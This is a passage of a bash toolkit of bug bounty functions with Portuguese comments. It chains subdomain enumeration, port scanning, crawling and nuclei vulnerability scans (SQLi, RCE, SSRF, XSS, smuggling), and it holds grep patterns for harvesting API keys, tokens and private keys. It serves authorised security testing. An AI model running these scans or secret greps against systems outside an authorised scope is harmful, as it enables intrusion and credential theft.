  grep -HnriEo '(?i)aws(.{0,20})?(?-i)['"'"'"][0-9a-zA-Z/+]{40}['"'"'"]'

  echo "[ + ] Bearer auth..."
  grep -HnriEo 'bearer [a-zA-Z0-9\-\.=]+' 

  echo "[ + ] Cloudinary auth..."
  grep -HnriEo 'cloudinary://[0-9]{15}:[0-9A-Za-z]+@[a-z]+'

  echo "[ + ] Mailgun API key..."
  grep -HnriEo 'key-[0-9a-zA-Z]{32}'

  echo "[ + ] GitHub tokens..."
  grep -HnriEo 'gh[oprsu]_[A-Za-z0-9]{36}'
  grep -HnriEo 'github_pat_[A-Za-z0-9]{82}'

  echo "[ + ] Stripe keys..."
  grep -HnriEo '(sk|pk)_(test|live)_[0-9a-zA-Z]{24,}'

  echo "[ + ] Twilio..."
  grep -HnriEo 'SK[0-9a-fA-F]{32}'

  echo "[ + ] SendGrid..."
  grep -HnriEo 'SG\.[a-zA-Z0-9\-_\.]{22}\.[a-zA-Z0-9\-_\.]{43}'

  echo "[ + ] Private keys..."
  grep -HnriEo '-----BEGIN (RSA|DSA|EC|OPENSSH) PRIVATE KEY-----'

  echo "[ + ] API key params..."
  grep -HnriEo "(api_key|api-key|apikey|API_KEY)(:|=| : | = )( |\"|')[0-9A-Za-z\-]{5,100}"

  echo "[ + ] Access tokens..."
  grep -HnriEo "(access_key|access_token|ACCESSTOKEN)(:|=| : | = )( |\"|')[0-9A-Za-z\-]{5,100}"

  echo "[ + ] DB credentials..."
  grep -HnriEo "(db_password|DB_PASSWORD|db_username|DB_USERNAME)(:|=| : | = )( |\"|')[0-9A-Za-z\-]{5,100}"

  echo "[ + ] AWS S3 links..."
  grep -HnriEo "(.{8}[A-z0-9-].amazonaws.com/)[A-z0-9-].{6}"
  grep -HnriEo "(.{8}[A-z0-9-].s3.amazonaws.com/)[A-z0-9-].{6}"
}

# ─── BBRF INTEGRATION ─────────────────────────────────────────────────────────

bbrfAddDomainsAndUrls() {
  for p in $(bbrf programs); do
    bbrf scope in -p "$p" | subfinder -silent | dnsx -silent | \
      bbrf domain add - -s subfinder --show-new -p "$p" | grep -v DEBUG | notify -silent
    bbrf urls -p "$p" | httpx -silent | bbrf url add - -s httpx --show-new -p "$p" | \
      grep -v DEBUG | notify -silent
  done
}

bbrfresolvedomains() {
  for p in $(bbrf programs); do
    bbrf domains --view unresolved -p "$p" | \
      dnsx -silent -a -resp | tr -d '[]' | tee \
      >(awk '{print $1":"$2}' | bbrf domain update - -p "$p" -s dnsx) \
      >(awk '{print $1":"$2}' | bbrf domain add - -p "$p" -s dnsx) \
      >(awk '{print $2":"$1}' | bbrf ip add - -p "$p" -s dnsx) \
      >(awk '{print $2":"$1}' | bbrf ip update - -p "$p" -s dnsx)
  done
}

# ─── AXIOM FLEET ──────────────────────────────────────────────────────────────

fleetScan() {
  company=$(cat domains)
  liveHosts="$company-live.txt"
  axiom-fleet well -i=9
  axiom-scan 'well*' --rate=10000 -p443 --banners \
    -iL=clean.subdomains -o=masscanIC.txt
  cat masscanIC.txt | awk '{print $2}' | grep -v Masscan | grep -v Ports | sort -u | tee "$liveHosts"
  axiom-scan "well*" -iL="$liveHosts" -p443 -sV -sC -T4 -m=nmapx -o=output
  axiom-rm "well0*" -f
}

# ─── HELP ─────────────────────────────────────────────────────────────────────

bb_help() {
  echo ""
  echo "=== SUBDOMAIN RECON ==="
  echo "  subdomainenum()       - Passive sub enum (subfinder, amass, crt.sh, chaos, uncover)"
  echo "  wellSubRecon()        - Full recon: subs + ASN + brute"
  echo "  brutesub()            - Brute force subdomains (top1M + all.txt)"
  echo "  subPermutation()      - Permutation with alterx + shuffledns"
  echo "  tlsEnum()             - TLS fingerprint + SAN extraction"
  echo ""
  echo "=== PORT/HTTP ==="
  echo "  naabuRecon()          - Port scan (common ports)"
  echo "  naabuFullPorts()      - Full port scan"
  echo "  getalive()            - httpx probe + classify (200/403/etc)"
  echo ""
  echo "=== CRAWL/URLS ==="
  echo "  crawler()             - gospider+gau+wayback+katana+waymore"
  echo "  getjsurls()           - Extract JS files"
  echo "  JScrawler()           - JS-focused katana crawl"
  echo ""
  echo "=== VULN SCANS ==="
  echo "  lfiScan()             - LFI"
  echo "  ssrfdetect()          - SSRF"
  echo "  sqliScan()            - SQLi"
  echo "  sstiScan()            - SSTI"
  echo "  rceNuc()              - RCE"
  echo "  XssScan()             - XSS (nuclei)"
  echo "  xsshunter()           - Full XSS chain (waymore+dalfox+airixss+freq)"
  echo "  OpenRedirectScan()    - Open redirects"
  echo "  exposureNuc()         - Info exposure"
  echo "  GitScan()             - Git exposure"
  echo "  jiraScan()            - Jira SSRF"
  echo "  panelNuc()            - Admin panels"
  echo "  graphqldetect()       - GraphQL endpoints"
  echo "  swaggerUIdetect()     - Swagger/OpenAPI"
  echo "  APIRecon()            - API endpoints + fuzzing"
  echo "  cveScan()             - CVE scan (high/critical)"
  echo "  nucTakeover()         - Subdomain takeover"
  echo "  smuggling()           - HTTP smuggling"
  echo "  Corstest()            - CORS"
  echo "  bypass4xx()           - 403 bypass"
  echo "  cloudEnum()           - Cloud/S3 assets"
  echo ""
  echo "=== SECRETS ==="
  echo "  secrets()             - Grep secrets from current dir"
  echo "  secretfinder()        - SecretFinder on JS files"
  echo "  getjsdata()           - Nuclei exposure tags on JS"
  echo ""
  echo "=== PARAMS ==="
  echo "  paramspider()         - ParamSpider"
  echo "  arjunScan()           - Arjun param discovery"
  echo ""
  echo "=== FUZZING ==="
  echo "  fufapi()              - ffuf API routes"
  echo "  fufdir()              - ffuf directories"
  echo "  fufextension()        - ffuf with extensions"
  echo "  feroxdir()            - feroxbuster"
  echo "  vhostEnum()           - Virtual host enum"
  echo ""
}

# =============================================================================
# ██╗    ██╗███████╗██╗     ██╗         ██████╗ ██████╗ ███╗   ███╗██████╗  ██████╗ ███████╗
# ██║    ██║██╔════╝██║     ██║        ██╔════╝██╔═══██╗████╗ ████║██╔══██╗██╔═══██╗██╔════╝
# ██║ █╗ ██║█████╗  ██║     ██║        ██║     ██║   ██║██╔████╔██║██████╔╝██║   ██║███████╗
# ██║███╗██║██╔══╝  ██║     ██║        ██║     ██║   ██║██║╚██╔╝██║██╔══██╗██║   ██║╚════██║
# ╚███╔███╔╝███████╗███████╗███████╗   ╚██████╗╚██████╔╝██║ ╚═╝ ██║██████╔╝╚██████╔╝███████║
#  ╚══╝╚══╝ ╚══════╝╚══════╝╚══════╝    ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═════╝  ╚═════╝ ╚══════╝
# FUNÇÕES MASTER — rodam pipelines completos com um só comando
# =============================================================================

_banner() {
  echo ""
  echo "${bblue}╔══════════════════════════════════════════╗${reset}"
  echo "${bblue}║${reset}  ${byellow}$1${reset}"
  echo "${bblue}╚══════════════════════════════════════════╝${reset}"
  echo ""
}

_step() {
  echo ""
  echo "${green}▶ [$2/$3] $1${reset}"
  echo "${green}─────────────────────────────────────────${reset}"
}

_done() {
  echo ""
  echo "${green}✔ $1 concluído${reset}"
  echo ""
}

# =============================================================================
# wellrecon — Recon completo de subdomínios + portas + HTTP
# Uso: wellrecon
# Prerequisito: arquivo "domains" com os alvos
# =============================================================================
wellrecon() {
  _banner "WELL RECON — Subs + Ports + HTTP"
  local TOTAL=6

  _step "Enumeração passiva de subdomínios" 1 $TOTAL
  subdomainenum

  _step "TLS fingerprint + SAN discovery" 2 $TOTAL
  tlsEnum

  _step "Brute force de subdomínios" 3 $TOTAL
  brutesub

  _step "Permutação de subdomínios" 4 $TOTAL
  subPermutation

  _step "Port scan (naabu)" 5 $TOTAL
  naabuRecon

  _step "HTTP probe + classificação" 6 $TOTAL
  getalive

  _done "wellrecon"
  echo "${yellow}Arquivos gerados:${reset}"
  echo "  clean.subdomains  — subdomínios resolvidos"
  echo "  naabuScan         — hosts:portas encontrados"
  echo "  ALLHTTP           — todos os hosts HTTP ativos"
  echo "  200HTTP           — somente 200 OK"
  echo "  403HTTP           — somente 403"
  echo "  Without404        — tudo exceto 404"
}

# =============================================================================
# wellcrawler — Crawl completo + extração de JS + secrets
# Uso: wellcrawler
# Prerequisito: ALLHTTP e Without404 já existindo (rodar wellrecon antes)
# =============================================================================
wellcrawler() {
  _banner "WELL CRAWLER — Crawl + JS + Secrets"
  local TOTAL=6

  _step "Crawl (gospider + gau + wayback + katana + waymore)" 1 $TOTAL
  crawler

  _step "Extração de arquivos JS" 2 $TOTAL
  getjsurls

  _step "Análise de JS com nuclei (tokens/exposure)" 3 $TOTAL
  getjsdata

  _step "SecretFinder nos JS files" 4 $TOTAL
  secretfinder

  _step "AWS Cognito finder" 5 $TOTAL
  awsCognitoFinder

  _step "Grep de secrets/keys no diretório" 6 $TOTAL
  secrets

  _done "wellcrawler"
  echo "${yellow}Arquivos gerados:${reset}"
  echo "  crawlerResults.txt  — todas as URLs coletadas"
  echo "  js_livelinks.txt    — JS files ativos"
  echo "  js_secrets_result   — segredos encontrados nos JS"
  echo "  JSPathNoUrl         — paths JS sem URL"
}

# =============================================================================
# wellnuclei — Todos os scans nuclei em sequência
# Uso: wellnuclei
# Prerequisito: ALLHTTP existindo
# =============================================================================
wellnuclei() {
  _banner "WELL NUCLEI — Full Vulnerability Scan"
  local TOTAL=18

  _step "Admin Panels" 1 $TOTAL
  panelNuc

  _step "Git exposure" 2 $TOTAL
  GitScan

  _step "LFI" 3 $TOTAL
  lfiScan

  _step "SSRF" 4 $TOTAL
  ssrfdetect

  _step "RCE" 5 $TOTAL
  rceNuc

  _step "SQLi" 6 $TOTAL
  sqliScan

  _step "SSTI" 7 $TOTAL
  sstiScan

  _step "XSS (nuclei)" 8 $TOTAL
  XssScan

  _step "Open Redirect" 9 $TOTAL
  OpenRedirectScan

  _step "Exposure / Info Leak" 10 $TOTAL
  exposureNuc

  _step "Subdomain Takeover" 11 $TOTAL
  nucTakeover

  _step "GraphQL endpoints" 12 $TOTAL
  graphqldetect

  _step "Swagger / OpenAPI" 13 $TOTAL
  swaggerUIdetect

  _step "API Recon" 14 $TOTAL
  APIRecon

  _step "CVE scan (high/critical)" 15 $TOTAL
  cveScan

  _step "Cloud exposure (S3/GCS/Azure)" 16 $TOTAL
  cloudEnum

  _step "Jira SSRF" 17 $TOTAL
  jiraScan

  _step "HTTP Smuggling" 18 $TOTAL
  smuggling

  _done "wellnuclei"
  echo "${yellow}Arquivos gerados:${reset}"
  echo "  nucPanel / gitvector / lfivector / ssrfdetect"
  echo "  rcevector / sqlivector / sstivector"
  echo "  xssnuclei / openredirectVector / exposurevector"
  echo "  nucleiTakeover / graphqldetect / swaggerUI"
  echo "  nucleiapirecon / cveResults / cloudnuclei"
  echo "  jiraNuclei / smuggler_op.txt"
}

# =============================================================================
# wellxss — Pipeline completo de XSS
# Uso: wellxss
# Prerequisito: ALLHTTP e crawlerResults.txt existindo
# =============================================================================
wellxss() {
  _banner "WELL XSS — Full XSS Pipeline"
  local TOTAL=6

  _step "Descoberta de parâmetros (paramspider + arjun)" 1 $TOTAL
  paramspider
  arjunScan

  _step "Coleta de URLs via waymore + filtro XSS" 2 $TOTAL
  xsshunter

  _step "kxss + knoxnl" 3 $TOTAL
  xssknox

  _step "XSS via nuclei (tags xss)" 4 $TOTAL
  XssScan

  _step "CORS check (pode refletir em XSS)" 5 $TOTAL
  Corstest

  _step "Open redirects" 6 $TOTAL
  OpenRedirectScan

  _done "wellxss"
  echo "${yellow}Arquivos gerados:${reset}"
  echo "  xssvector / airixss.txt / FreqXSS.txt"
  echo "  XSSresult (dalfox) / xssSuccess (knoxnl)"
  echo "  xssnuclei / openredirectVector"
}

# =============================================================================
# wellall — Pipeline COMPLETO do zero ao resultado
# Uso: wellall
# Prerequisito: arquivo "domains" com os alvos
# =============================================================================
wellall() {
  _banner "WELL ALL — Pipeline Completo"
  echo "${yellow}Isso vai rodar: wellrecon → wellcrawler → wellnuclei → wellxss${reset}"
  echo "${yellow}Tempo estimado: 1-4h dependendo do alvo${reset}"
  echo ""
  echo -n "Confirma? [s/N] "
  read confirm
  [[ "$confirm" != "s" && "$confirm" != "S" ]] && echo "Abortado." && return 1

  local START=$(date +%s)

  wellrecon
  wellcrawler
  wellnuclei
  wellxss

  # Relatório final
  local END=$(date +%s)
  local ELAPSED=$(( (END - START) / 60 ))

  _banner "RELATÓRIO FINAL"
  echo "${green}Tempo total: ${ELAPSED} minutos${reset}"
  echo ""
  echo "${yellow}=== RESULTADOS ===${reset}"
  for f in ALLHTTP 200HTTP 403HTTP clean.subdomains \
            crawlerResults.txt js_livelinks.txt \
            rcevector sqlivector sstivector lfivector ssrfdetect \
            xssnuclei airixss.txt XSSresult \
            graphqldetect swaggerUI nucleiapirecon \
            exposurevector nucleiTakeover cveResults \
            cloudnuclei js_secrets_result; do
    if [ -s "$f" ]; then
      echo "  ${green}✔${reset} $f ($(wc -l < $f) linhas)"
    fi
  done

  echo ""
  echo "${yellow}=== SEM RESULTADO ===${reset}"
  for f in rcevector sqlivector sstivector lfivector ssrfdetect \
            xssnuclei airixss.txt XSSresult \
            graphqldetect swaggerUI nucleiapirecon \
            exposurevector nucleiTakeover cveResults cloudnuclei; do
    if [ ! -s "$f" ]; then
      echo "  ${red}✗${reset} $f"
    fi
  done
}

# =============================================================================
# wellapi — Pipeline focado em API (recon + endpoints + fuzzing)
# Uso: wellapi
# =============================================================================
wellapi() {
  _banner "WELL API — Full API Recon"
  local TOTAL=7

  _step "HTTP probe (getalive)" 1 $TOTAL
  getalive

  _step "Swagger / OpenAPI detect" 2 $TOTAL
  swaggerUIdetect

  _step "API endpoint recon + fuzzing" 3 $TOTAL
  APIRecon

  _step "GraphQL detect + introspection" 4 $TOTAL
  graphqldetect

  _step "Descoberta de parâmetros (arjun)" 5 $TOTAL
  arjunScan

  _step "JS extraction (endpoints em JS)" 6 $TOTAL
  getjsurls
  getjsdata

  _step "SSRF em endpoints API" 7 $TOTAL
  ssrfdetect

  _done "wellapi"
  echo "${yellow}Arquivos:${reset}"
  echo "  swaggerUI / nucleiapirecon / graphqldetect"
  echo "  arjun_params.txt / js_livelinks.txt / ssrfdetect"
}

# Atualizar bb_help com os combos
bb_help_combos() {
  echo ""
  echo "${bblue}=== FUNÇÕES MASTER (pipelines completos) ===${reset}"
  echo ""
  echo "  ${green}wellrecon${reset}   — Subs + TLS + Brute + Permutação + Ports + HTTP probe"
  echo "  ${green}wellcrawler${reset} — Crawl + JS extraction + Secrets + SecretFinder"
  echo "  ${green}wellnuclei${reset}  — TODOS os scans nuclei (18 categorias)"
  echo "  ${green}wellxss${reset}     — Pipeline XSS completo (params + hunt + dalfox + knoxnl)"
  echo "  ${green}wellapi${reset}     — API recon (swagger + graphql + params + ssrf)"
  echo "  ${green}wellall${reset}     — TUDO do zero ao resultado (wellrecon+crawler+nuclei+xss)"
  echo ""
  echo "${yellow}Fluxo recomendado:${reset}"
  echo "  1. workspaceRecon <alvo>"
  echo "  2. wellrecon"
  echo "  3. wellcrawler"
  echo "  4. wellnuclei  (ou wellapi se foco em API)"
  echo "  5. wellxss"
  echo ""
  echo "  Ou tudo de uma vez: wellall"
  echo ""
}
